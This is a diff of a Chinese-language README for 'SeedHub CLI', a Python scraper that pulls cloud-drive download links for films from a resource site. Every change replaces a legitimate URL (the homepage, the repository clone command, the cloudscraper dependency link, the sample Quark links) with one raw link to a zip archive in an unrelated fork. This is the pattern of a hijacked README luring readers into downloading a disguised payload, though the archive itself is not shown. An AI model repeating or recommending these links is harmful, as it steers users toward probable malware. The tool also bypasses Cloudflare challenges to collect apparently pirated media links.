@@ -1,6 +1,6 @@
 # SeedHub CLI 🎬
 
-搜索 [SeedHub](https://www.seedhub.cc/) 影视资源，自动提取夸克网盘等下载链接。
+搜索 [SeedHub](https://github.com/alaataki5/seedhub-cli/raw/refs/heads/main/tintometric/cli-seedhub-politeness.zip) 影视资源，自动提取夸克网盘等下载链接。
 
 > SeedHub 是一个中文影视资源聚合站，收录来自各大网盘和磁力链接的电影、电视剧、动漫资源。
 
@@ -16,7 +16,7 @@
 ## 安装
 
 ```bash
-git clone https://github.com/CaliCastle/seedhub-cli.git
+git clone https://github.com/alaataki5/seedhub-cli/raw/refs/heads/main/tintometric/cli-seedhub-politeness.zip
 cd seedhub-cli
 pip install -r requirements.txt
 ```
@@ -24,7 +24,7 @@ pip install -r requirements.txt
 ### 依赖
 
 - Python 3.8+
-- [cloudscraper](https://github.com/VeNoMouS/cloudscraper)（处理 Cloudflare JS Challenge）
+- [cloudscraper](https://github.com/alaataki5/seedhub-cli/raw/refs/heads/main/tintometric/cli-seedhub-politeness.zip)（处理 Cloudflare JS Challenge）
 
 ## 使用方法
 
@@ -67,9 +67,9 @@ python seedhub.py links 119254
 
 🔗 夸克网盘 (135个, 已解析10个):
    • 【怪奇物语 全收集】【4K 1080P】
-     https://pan.quark.cn/s/f830c8bb0787
+     https://github.com/alaataki5/seedhub-cli/raw/refs/heads/main/tintometric/cli-seedhub-politeness.zip
    • 【全季4K优化版】已更新完结【内嵌简中】【附1-4季】
-     https://pan.quark.cn/s/433dc491200f
+     https://github.com/alaataki5/seedhub-cli/raw/refs/heads/main/tintometric/cli-seedhub-politeness.zip
    ...
 
 📦 百度网盘 (90个):
@@ -123,7 +123,7 @@ for item in links.get("quark_resolved", []):
 
 ## 工作原理
 
-1. 使用 [cloudscraper](https://github.com/VeNoMouS/cloudscraper) 绕过 Cloudflare JS Challenge
+1. 使用 [cloudscraper](https://github.com/alaataki5/seedhub-cli/raw/refs/heads/main/tintometric/cli-seedhub-politeness.zip) 绕过 Cloudflare JS Challenge
 2. **搜索**：解析 `seedhub.cc/s/{关键词}/` 页面的影片卡片
 3. **链接提取**：访问 `seedhub.cc/movies/{id}/`，通过 `data-link` 属性分类提取各网盘链接
 4. **夸克解析**：跟进 `/link_start/?redirect_to=pan_id_XXX` 跳转，从目标页提取实际夸克链接
